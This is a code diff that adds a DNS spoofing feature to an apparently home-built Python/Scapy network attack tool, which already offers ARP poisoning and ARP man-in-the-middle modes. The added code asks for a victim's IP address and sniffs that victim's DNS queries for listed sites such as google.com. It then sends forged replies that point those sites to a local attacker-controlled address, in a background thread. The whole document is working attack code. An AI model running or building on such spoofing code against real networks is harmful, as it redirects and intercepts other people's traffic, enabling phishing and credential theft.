@@ -1,4 +1,5 @@
 from scapy.all import *
+from scapy.all import ARP, DNS, Ether, IP, UDP, DNS, DNSQR, DNSRR
 #from scapy.all import Ether, ARP, get_if_addr, conf, sendp
 import argparse
 from time import sleep
@@ -52,10 +53,11 @@ class ARPP(object):
             "arp poison":self.ARP_poison,\
             "exit":sys.exit,\
             "select interface":self.select_interface,\
-            "end an ARP poisoning process": self.end_ARP,\
-            "end all ARP poisoning processes":self.end_all_threads,\
-            "show ARP poisoning processes":self.show_arp_poisoning_threads,\
-            "arp mitm":self.ARP_MITM}
+            "end a threaded task": self.end_ARP,\
+            "end all threaded tasks":self.end_all_threads,\
+            "show running threads":self.show_arp_poisoning_threads,\
+            "arp mitm":self.ARP_MITM,\
+            "DNS spoofing":self.DNS_spoof_startup}
         #self.TASK_DICT = collections.OrderedDict(sorted(self.TASK_DICT_temp.items())) #sorting ditcionary by keys
         self.THREADED_TASKS = []
         self.EVENTS = []
@@ -324,6 +326,8 @@ class ARPP(object):
             alive_tasks_names[i] = task.getName()
             if task.is_alive():
                 print("{}: {}".format(i, task.getName()))
+        if not alive_tasks_names:
+            print("[!] There are no running threads")
         
     def end_ARP(self):
         print("From the following threads select the processes to terminate:")
@@ -341,6 +345,72 @@ class ARPP(object):
         except:
             tb = traceback.format_exc()
             print(tb)
+    
+    def DNS_spoof_startup(self):
+        self._assure_interface_is_selected()
+        
+        # get IP of victim as input
+        answer = ""
+        try:
+            while not self._is_valid_ip(answer):
+                answer = str(input("ip of victim>>"))
+        except KeyboardInterrupt:
+            pass
+        
+        # start the DNS spoofing
+        self.DNS_spoof(ipVictim=answer)
+    
+    def DNS_spoof(self, ipVictim=""):
+        target_sites = {"google.com.":"192.168.178.217",\
+            "test.nl":"192.168.178.217"}
+        
+        def packet_callback(packet:scapy):
+            if DNS in packet and DNSQR in packet and IP in packet and packet[IP].src == ipVictim:
+                print(f"DNS in packet: {DNS in packet}") 
+                print(f"DNS request for targeted site: {any([target_site in str(packet[DNSQR].qname) for target_site in target_sites.keys()])}" ) 
+                print(f"Packet operation code is 0: {packet[DNS].opcode==0}")
+            def send_spoofed_response():
+                # if  (DNS in packet)\
+                #         and (IP in packet)\
+                #         and (packet[IP].src == ipVictim)\
+                #         and (packet[DNS].opcode==0)\
+                #         and (DNSQR in packet)\
+                #         and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
+                #         print("Caught DNS request ")
+                if  (DNS in packet)\
+                        and (IP in packet)\
+                        and (packet[IP].src == ipVictim)\
+                        and (packet[DNS].opcode==0)\
+                        and (DNSQR in packet)\
+                        and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
+                    # if it's a DNS request and it's coming from the victim and it's a QUERY (i.e. opcode=0) then send fake reply
+                    print("Caught DNS request from {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
+                    
+                    index_of_target_site = [target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()].index(1)
+                    fake_ip = list(target_sites.values())[index_of_target_site]
+                    
+                    fake_DNS_reply = IP(dst=packet[IP].src)\
+                        /UDP(dport=packet[UDP].sport, sport=53)\
+                        /DNS(id=packet[DNS].id,ancount=1,an=DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip))\
+                        /DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip)
+                    send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
+                    print("Sent fake DNS reply to {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
+            send_spoofed_response()
+                        
+        
+        e=threading.Event()
+        def rec(event):
+            while True:
+                sniff(timeout=5, prn=packet_callback, count=10)
+                if event.is_set():
+                    break
+        
+        T = threading.Thread(target=rec, name="DNS spoofing user with IP {}".format(ipVictim), args=(e,))
+        
+        self.THREADED_TASKS.append(T)
+        self.EVENTS.append(e)
+        self.THREADED_TASKS[-1].start()
+        print("Started DNS spoofing user with IP {}".format(ipVictim))
         
     def end_all_threads(self):
         if self.THREADED_TASKS != []:
